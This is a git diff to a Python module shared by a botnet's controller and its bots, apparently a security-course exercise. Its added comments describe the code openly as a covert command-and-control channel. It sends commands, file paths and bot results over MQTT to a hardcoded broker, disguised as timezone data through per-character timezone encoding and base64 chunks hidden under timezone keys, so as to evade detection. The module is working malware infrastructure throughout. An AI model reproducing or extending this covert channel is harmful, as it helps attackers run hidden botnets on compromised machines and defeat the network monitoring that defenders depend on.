@@ -1,4 +1,7 @@
 # Common code for both controller and bot
+# Implements steganography-based C&C communication using timezone data as a covert channel
+# Messages are disguised as timezone data to evade detection
+
 from dataclasses import dataclass, field
 from typing import Optional
 from datetime import datetime
@@ -8,17 +11,10 @@ import random
 import base64
 import json
 
-# MQTT configuration
+# MQTT broker configuration for C&C communication
 MQTT_BROKER = "147.32.82.209"
 MQTT_PORT = 1883
 MQTT_TOPIC = "sensors"
-
-# Message fields
-MSG_FIELD_TO_FAKE_LEGITIMATE = "local_datetime" # will send legitimate local datetime, just to act trustworthy
-MSG_FIELD_BOT_ID = "local_datetime_leap"
-MSG_FIELD_ENCRYPTED_MSG = "datetime_leap"
-MSG_FIELD_TIMEZONES = "timezones"
-MSG_FIELD_ACTION = "timezone"
 
 # Commands
 CMD_LIST_BOTS = 1
@@ -59,7 +55,7 @@ CHAR_TO_TIMEZONE = {
     "q": "America/Montevideo",
     "r": "America/Recife",
     "s": "America/Santiago",
-    "t": "America/Taipei",  # if you want strict uniqueness, see note below
+    "t": "America/Taipei",
     "u": "Australia/Perth",
     "v": "America/Vancouver",
     "w": "America/Winnipeg",
@@ -89,7 +85,7 @@ CHAR_TO_TIMEZONE = {
     "U": "Asia/Ulaanbaatar",
     "V": "Europe/Vienna",
     "W": "Europe/Warsaw",
-    "X": "America/Cancun",  # X is difficult - using location with X sound
+    "X": "America/Cancun",
     "Y": "America/Yakutat",
     "Z": "Europe/Zurich",
     ",": "Africa/Johannesburg",
@@ -109,28 +105,41 @@ CHAR_TO_TIMEZONE = {
     "9": "Asia/Seoul",
 }
 
+# Reverse mapping for decoding timezones back to characters
 TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}
 
 @dataclass
 class RequestMessage:
-    # Will send legitimate local datetime, just to act trustworthy
+    """
+    Base message format for C&C communication.
+    Disguised as timezones information.
+    Fields serve dual purposes legitimate-looking data + covert C&C channel.
+    """
+    # Legitimate datetime to make message appear benign
     local_datetime: str = field(default_factory=lambda: datetime.now().isoformat()) 
 
-    device_id: Optional[str] = None           # Bot ID
-    datetime_leap: Optional[str] = None       # Encrypted message
-    timezones: Optional[list[str]] = None     # Obfuscated message
-    timezone: Optional[str] = None            # User action. Only controller sends this field.
+    device_id: Optional[str] = None           # Bot ID (disguised as device ID)
+    datetime_leap: Optional[str] = None       # Encrypted message for large payloads
+    timezones: Optional[list[str]] = None     # Obfuscated message for small payloads
+    timezone: Optional[str] = None            # Command code (only controller sends this)
     
     @classmethod
     def from_json(cls, json_str: str):
+        """
+        Deserialize JSON message into RequestMessage object.
+        Raises UnknownDeviceError if format doesn't match (not from our C&C network).
+        """
         try:
             data = json.loads(json_str)
             return cls(**data)
         except Exception:
-            # if we can't deserialize - means different contract
+            # If we can't deserialize, it's not from our C&C network
             raise UnknownDeviceError()
     
     def to_json(self) -> str:
+        """
+        Serialize message to JSON, including only non-None fields.
+        """
         json_obj = {}
         if self.local_datetime is not None:
             json_obj["local_datetime"] = self.local_datetime
@@ -145,32 +154,48 @@ class RequestMessage:
         return json.dumps(json_obj)
     
     def get_user_action(self):
+        """
+        Decode the controller command from the timezone field.
+        Returns the controller command code (1-6) or None if no valid command found.
+        """
         if self.timezone is None:
             return None
         action_timezone = self.timezone.upper()
         if action_timezone not in TIMEZONE_TO_ACTION:
-            # unknown timezone
+            # Unknown timezone - not a valid command
             return None
         return TIMEZONE_TO_ACTION[action_timezone]
     
     def set_device_id(self, fake_device_id: str):
-        """This device ID will be sent as is. It must look legitimate."""
+        """
+        Set the bot ID in the message.
+        !!! The ID is disguised as a legitimate device identifier. !!!
+        """
         self.device_id = fake_device_id
 
     def set_user_action(self, user_action: int):
+        """
+        Encode a controller command as a timezone in the message.
+        Also sets the local_datetime to match that timezone for authenticity.
+        """
         if user_action not in COMMAND_TO_TIMEZONE:
             raise Exception(f"Timezone is missing for action number {user_action}")
+        # Encode command as a timezone string
         self.timezone = COMMAND_TO_TIMEZONE[user_action]
 
         try:
+            # Set datetime in that timezone to make message look legitimate
             now_utc = datetime.now(ZoneInfo("UTC"))
             self.local_datetime = now_utc.astimezone(ZoneInfo(self.timezone)).isoformat()
         except Exception:
-            # ignore error, set anything
+            # Ignore error, use any datetime
             self.local_datetime = datetime.now().isoformat()
 
-    
     def get_message(self):
+        """
+        Extract and decode the hidden message from the request.
+        Automatically detects and uses the appropriate decoding method.
+        """
         if self.datetime_leap is not None:
             return decrypt(self.datetime_leap)
         if self.timezones is not None:
@@ -178,7 +203,11 @@ class RequestMessage:
         return None
     
     def set_message(self, message: str | None):
-        """Set message to be sent, either encrypted or obfuscated depending on length."""
+        """
+        Hide a message in the request using steganography.
+        Short messages (<=100 chars) use timezone obfuscation.
+        Long messages use base64 encryption distributed across timezone chunks.
+        """
         self.datetime_leap = None
         self.timezones = None
         
@@ -191,36 +220,56 @@ class RequestMessage:
 
 @dataclass
 class ControllerMessage:
-    user_action: int
-    path: Optional[str] = None
+    """
+    Parsed command message from the controller.
+    Contains the action to execute and optional path parameter.
+    """
+    user_action: int                # Command code (1-6)
+    path: Optional[str] = None      # Optional path for file/directory operations
 
     @classmethod
     def from_request(cls, request: RequestMessage):
+        """
+        Parse a controller command from a RequestMessage.
+        Validates that the message contains a valid command.
+        """
         if request.timezone is None:
             raise UnknownDeviceError()
         
-        # if no user action is presented, that means the message is not from controller
+        # Extract the command code from the timezone field
         user_action = request.get_user_action()
         if user_action is None:
+            # No valid action means not from our controller
             raise UnknownDeviceError()
         
+        # Extract optional path parameter from hidden message
         path = request.get_message()
         
         return cls(user_action=user_action, path=path)
 
 @dataclass
 class BotMessage:
-    device_id: Optional[str]
-    message: Optional[str]
+    """
+    Parsed response message from a bot.
+    Contains the bot's ID and its response data.
+    """
+    device_id: Optional[str]    # Bot identifier
+    message: Optional[str]      # Command execution result
 
     @classmethod
     def from_request(cls, request: RequestMessage):
+        """
+        Parse a bot response from a RequestMessage.
+        Validates that it's a bot response (not a controller command).
+        """
+        # Bot responses should not contain command codes
         if request.get_user_action() is not None:
             raise UnknownDeviceError()
 
         device_id = request.device_id
         message = request.get_message()
 
+        # Must have at least bot ID or message
         if device_id is None and message is None:
             raise UnknownDeviceError()
 
@@ -228,11 +277,23 @@ class BotMessage:
         
 
 def encrypt(text: str):
+    """
+    Encrypt text by encoding as base64 and distributing chunks across timezone keys.
+    Used for longer messages that exceed obfuscation character limit.
+    
+    Process:
+    1. Base64 encode the text
+    2. Split into random-sized chunks (7-20 chars)
+    3. Map chunks to timezone keys in a JSON object
+    4. Return JSON string that looks like timezone configuration data
+    """
+    # Base64 encode the message
     encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
     
-    # char_to_timezone values
+    # Use all available timezones as potential keys
     timezones = list(CHAR_TO_TIMEZONE.values())
     
+    # Split encoded message into random-sized chunks for obfuscation
     chunks = []
     i = 0
     while i < len(encoded):
@@ -240,7 +301,7 @@ def encrypt(text: str):
         chunks.append(encoded[i:i+chunk_size])
         i += chunk_size
     
-    # create JSON mapping timezones to chunks, cycling through timezones if needed
+    # Distribute chunks across timezone keys, cycling through available timezones
     result = {}
     for idx, chunk in enumerate(chunks):
         timezone = timezones[idx % len(timezones)]
@@ -252,26 +313,36 @@ def encrypt(text: str):
 
 
 def decrypt(encrypted_json: str):
+    """
+    Decrypt message that was hidden using encrypt() function.
+    Reconstructs chunks in correct order and decodes from base64.
+    
+    Process:
+    1. Parse JSON to get timezone-to-chunks mapping
+    2. Reconstruct chunks in original order by cycling through timezones
+    3. Concatenate chunks and base64 decode
+    """
     data = json.loads(encrypted_json)
     
-    # char_to_timezone values
+    # Get the list of timezones used for chunk distribution
     timezones = list(CHAR_TO_TIMEZONE.values())
     
-    # Reconstruct chunks in correct order
+    # Reconstruct chunks in the order they were distributed
     chunks = []
     timezone_idx = 0
-    chunk_counts = {tz: 0 for tz in timezones}
+    chunk_counts = {tz: 0 for tz in timezones}  # Track chunks extracted per timezone
     
-    # Continue until all chunks are collected
+    # Cycle through timezones collecting chunks in original order
     while True:
         current_tz = timezones[timezone_idx % len(timezones)]
         
+        # If this timezone has more chunks to extract, get the next one
         if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
             chunks.append(data[current_tz][chunk_counts[current_tz]])
             chunk_counts[current_tz] += 1
             timezone_idx += 1
         else:
-            # Check if we've collected all chunks
+            # Check if we've collected all chunks from all timezones
             all_collected = all(
                 tz not in data or chunk_counts[tz] == len(data[tz])
                 for tz in timezones
@@ -280,27 +351,37 @@ def decrypt(encrypted_json: str):
                 break
             timezone_idx += 1
             
-        # Safety check to avoid infinite loop
+        # Safety check to prevent infinite loops
         if timezone_idx > 10000:
             break
     
-    # Concatenate chunks and decode
+    # Reconstruct the base64 string and decode to original text
     encoded = ''.join(chunks)
     decoded = base64.b64decode(encoded).decode('utf-8')
     return decoded
 
 def obfuscate(message: str) -> list[str]:
-    """Convert message to list of timezones. Convert each character to its corresponding timezone"""
+    """
+    Obfuscate a short message by encoding each character as a timezone.
+    Used for messages <=100 characters.
+    
+    Each character is replaced with its corresponding timezone from CHAR_TO_TIMEZONE.
+    Unknown characters default to space timezone (Africa/Lagos).
+    Results in a list that looks like legitimate timezone data.
+    """
     obfuscated = []
     for char in message:
         if char in CHAR_TO_TIMEZONE:
             obfuscated.append(CHAR_TO_TIMEZONE[char])
-        else: # char missing in dictionary
+        else: # Character not in dictionary - use space as fallback
             obfuscated.append(CHAR_TO_TIMEZONE[' '])
     return obfuscated
 
 def deobfuscate(obfuscated_msg: list[str]) -> str:
-    """Convert list of timezones back to message"""
+    """
+    Decode a message that was obfuscated using obfuscate() function.
+    Converts list of timezones back to original text.
+    """
     deobfuscated = []
     for tz in obfuscated_msg:
         if tz.upper() in TIMEZONE_TO_CHAR:
@@ -308,5 +389,8 @@ def deobfuscate(obfuscated_msg: list[str]) -> str:
     return ''.join(deobfuscated)
 
 class UnknownDeviceError(Exception):
-    """Message received from unknown device."""
+    """
+    Exception raised when a message is received from an unrecognized device.
+    Used to filter out non-C&C traffic and maintain operational security.
+    """
     pass
